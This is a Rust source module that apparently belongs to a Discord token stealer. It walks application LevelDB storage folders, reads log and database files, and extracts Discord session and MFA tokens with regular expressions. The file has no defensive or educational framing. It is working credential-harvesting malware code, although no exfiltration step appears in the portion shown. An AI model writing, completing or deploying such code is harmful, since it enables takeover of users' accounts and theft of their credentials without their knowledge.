mod config;
mod types;

use regex::Regex;
use std::{collections::HashSet, fs, io::Read};
use types::DiscordToken;

pub fn find_tokens() -> Vec<DiscordToken> {
    let mut tokens = HashSet::new();
    let apps = config::get_paths();

    // Regex token patterns
    let token_pattern = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").unwrap();
    let mfa_pattern = Regex::new(r"mfa\.[\w-]{84}").unwrap();

    for app in apps {
        let path = app.path.join("Local Storage\\leveldb");

        if !path.exists() {
            continue;
        }

        if let Ok(entries) = fs::read_dir(&path) {
            for entry in entries.flatten() {
                let file_path = entry.path();
                let file_name = entry.file_name().into_string().unwrap_or_default();

                if !file_name.ends_with(".log")
                    && !file_name.ends_with(".ldb")
                    && !file_name.ends_with(".sqlite")
                {
                    continue;
                }

                if let Ok(mut file) = fs::File::open(&file_path) {
                    let mut content = Vec::new();
                    let _ = file.read_to_end(&mut content);

                    let text = String::from_utf8_lossy(&content);

                    for token in token_pattern.find_iter(&text) {
                        let token_str = token.as_str();
                        tokens.insert(DiscordToken {
                            token: token_str.to_string(),
                            platform: app.name.to_string(),
                        });
                    }

                    for token in mfa_pattern.find_iter(&text) {
                        let token_str = token.as_str();
                        tokens.insert(DiscordToken {
                            token: token_str.to_string(),
                            platform: app.name.to_string(),
                        });
                    }
                }
            }
        }
    }

    tokens.into_iter().collect()
}
